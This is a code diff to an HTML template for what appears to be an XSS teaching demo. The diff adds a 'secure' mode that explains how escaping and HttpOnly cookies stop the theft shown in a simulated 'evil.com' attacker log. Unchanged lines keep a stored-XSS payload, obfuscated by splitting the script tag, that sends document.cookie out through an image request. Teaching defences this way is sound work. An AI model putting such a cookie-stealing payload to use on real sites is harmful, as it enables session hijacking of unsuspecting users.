@@ -36,7 +36,11 @@
 
     <div class="attacker">
       <div class="cap">🕵️ ATTACKER SERVER LOG (evil.com)</div>
-      <div class="loot" id="loot">{{ loot and ('attacker received → ' + loot) or 'waiting for a victim to load a page with the payload…' }}</div>
+      {% if mode == 'secure' %}
+        <div class="loot">— empty. The comment is escaped (the script never runs) and the cookie is <b>HttpOnly</b>, so <code>document.cookie</code> can't read it.</div>
+      {% else %}
+        <div class="loot" id="loot">{{ loot and ('attacker received → ' + loot) or 'waiting for a victim to load a page with the payload…' }}</div>
+      {% endif %}
     </div>
   </div>
 
@@ -60,13 +64,18 @@ Set-Cookie: vl_demo_session=…; HttpOnly  # JavaScript cannot read it</code></p
       document.getElementById('c').value =
         '<scr'+'ipt>new Image().src="/xss/collect?c="+encodeURIComponent(document.cookie)</scr'+'ipt>';
     }
+  </script>
+  {% if mode != 'secure' %}
+  <script>
     async function poll(){
       try{
         const r = await fetch('/xss/loot');
         const j = await r.json();
-        if(j.captured){ document.getElementById('loot').textContent = 'attacker received → ' + j.captured; }
+        const el = document.getElementById('loot');
+        if(j.captured && el){ el.textContent = 'attacker received → ' + j.captured; }
       }catch(e){}
     }
     setInterval(poll, 1500); poll();
   </script>
+  {% endif %}
 {% endblock %}
